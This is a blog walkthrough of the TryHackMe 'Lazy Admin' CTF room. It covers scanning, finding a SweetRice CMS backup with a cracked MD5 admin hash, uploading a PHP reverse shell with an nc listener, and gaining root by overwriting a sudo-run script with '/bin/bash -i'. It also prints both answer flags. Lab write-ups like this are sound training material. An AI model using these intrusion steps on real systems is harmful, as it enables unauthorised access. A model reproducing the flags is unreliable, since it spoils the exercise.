---
layout: post
title: Lazy Admin
date: 2023-03-07 12:00 +0700
categories: [THM, easy]
---

### Introduction

[Lazy Admin] is an easy CTF on TryHackMe that showcases scanning and enumeration, research, exploitation, and sudo privilege escalation.

![lazyadmin](https://tryhackme-images.s3.amazonaws.com/room-icons/efbb70493ba66dfbac4302c02ad8facf.jpeg)



---

Let's start scaning the machine with nmap.

```sh
nmap -sSV -p- --open --min-rate 5000 <IP> -oN <outputfile.txt>
```

![Scan](/images/THM/lazyadmin/Captura.PNG)

If we go to the web we can see there is nothing interesting only the Apache2 service.

![web](/images/THM/lazyadmin/Captura2.PNG)

Time to do a directory scan.

```sh
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -q -t 40 -x html,txt,php
```

![web scan](/images/THM/lazyadmin/Captura3.PNG)

We found a directory called **content** that contains a **SweetRice CMS**.

![cms](/images/THM/lazyadmin/Captura4.PNG)

If we go to the **as** directory we can see the admin login.

![cms-login](/images/THM/lazyadmin/Captura5.PNG)

Searching a bit inner the directories in the folder **inc** we can found a **mysql_backup**.

![mysql](/images/THM/lazyadmin/mysql.PNG)

Inner It we can get the admin credentials, but the password is encrypted in md5.

![credentials](/images/THM/lazyadmin/mysql2.PNG)

This time I used [crackstation] for crack it instead other system tools.

![crack](/images/THM/lazyadmin/mysql3.PNG)

Once is cracked we can login.

Is time to get a shell!

![admin page](/images/THM/lazyadmin/Captura6.PNG)

Researching a little we can find an [exploit] in exploit-db.

In the exploit, explains that we can take advantage of ADS section.

![exploit](/images/THM/lazyadmin/Captura7.PNG)

We will use pentestmonkey php reverse shell, pointing to our IP and the port we configure our listener.

![ads admin](/images/THM/lazyadmin/Captura8.PNG)

```sh
nc -lvnp 4444
```

![listener](/images/THM/lazyadmin/Captura9.PNG)

If we go to the web-shell we've created and is well configured, we will receive the connection.

![conn](/images/THM/lazyadmin/Captura10.PNG)

Time to get an interactive shell!

```sh
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![interactive shell](/images/THM/lazyadmin/Captura11.PNG)

Researching a little we can find the user flag in **/home/itguy**.

```sh
cat user.txt
```

![user flag](/images/THM/lazyadmin/Captura12.PNG)

- What is the user flag?
>Answer: THM{63e5bce9271952aad1113b6f1ac28a07}

Time to elevate our privileges.

If we list our allowed sudo commands for our user, we can see, that we can execute a perl script like root.

```sh
sudo -l
```

![sudo -l](/images/THM/lazyadmin/Captura13.PNG)

Let's see what contains **backup.pl**.

```sh
cat backup.pl
```

We can see that script execute a bash script called **copy.sh**. If we see the permissions of it, we can modify it, so let's take advantage of this and modify the file to get our root prompt.

![cat backup](/images/THM/lazyadmin/Captura14.PNG)

We can put a the bash command and the -i option to get our root interactive shell.

```sh
echo "/bin/bash -i" > /etc/copy.sh
cat /etc/copy.sh
```

![copy.sh modify](/images/THM/lazyadmin/Captura15.PNG)

Time to execute it! And if all we did is correctly we got a root shell.


```sh
sudo /usr/bin/perl /home/itguy/backup.pl
id
```

![sudo vuln](/images/THM/lazyadmin/Captura16.PNG)

Now we can go to the root directory, see the root flag and we've complete this machine.

```sh
cd /root
ls
cat root.txt
```

![root flag](/images/THM/lazyadmin/Captura17.PNG)

- What is the root flag?
>Answer: THM{6637f41d0177b6f37cb20d775124699f}



 [lazy admin]:https://tryhackme.com/room/lazyadmin
 [crackstation]:https://crackstation.net/
 [exploit]:https://www.exploit-db.com/exploits/40700
